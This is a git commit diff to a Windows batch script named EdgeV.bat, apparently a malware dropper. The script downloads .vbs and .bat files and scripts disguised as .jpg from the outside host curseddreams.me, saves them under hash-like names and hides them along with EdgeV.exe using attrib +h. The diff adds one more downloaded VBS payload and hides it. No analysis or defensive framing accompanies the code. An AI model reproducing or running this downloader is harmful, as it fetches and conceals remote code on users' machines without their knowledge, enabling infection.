9607841b3208e29ab0423d62c23db425663d2d46
FaZeMelon <ryanmonkills6@gmail.com>
2017-03-18 03:23:17 +0100

    Update EdgeV.bat

--- scripts/EdgeV.bat
+++ scripts/EdgeV.bat
@@ -1,5 +1,7 @@
 @echo off
 :start
+IF EXIST b5754nfhHuf58Gd4568.vbs goto nextfile4
+:nextfile4
 IF EXIST 7b96332f2c9f777574ba038be0334018.jpg goto nextfile1
 :nextfile1
 IF EXIST d3745b53b599b72e9cb750f4d757560d.vbs goto nextfile2
@@ -9,12 +11,15 @@ IF EXIST FileScheduler.bat goto nextfile3
 IF NOT EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto files
 IF NOT EXIST d3745b53b599b72e9cb750f4d757560d.bat goto files
 IF NOT EXIST 7b96332f2c9f777574ba038be0334018.vbs goto files
+IF NOT EXIST b5754nfhHuf58Gd4568.vbs goto files
 :files
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/7b96332f2c9f777574ba038be0334018.jpg', 'ec372a061f8a3c0432bb4575216c7f75.jpg')"
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/FileScheduler.bat', 'd3745b53b599b72e9cb750f4d757560d.bat')"
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/d3745b53b599b72e9cb750f4d757560d.vbs', '7b96332f2c9f777574ba038be0334018.vbs')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/DankMemes.vbs', 'b5754nfhHuf58Gd4568.vbs')"
 attrib +h 7b96332f2c9f777574ba038be0334018.jpg
 attrib +h d3745b53b599b72e9cb750f4d757560d.bat
 attrib +h ec372a061f8a3c0432bb4575216c7f75.jpg
+attrib +h b5754nfhHuf58Gd4568.vbs
 attrib +h EdgeV.exe
 :end
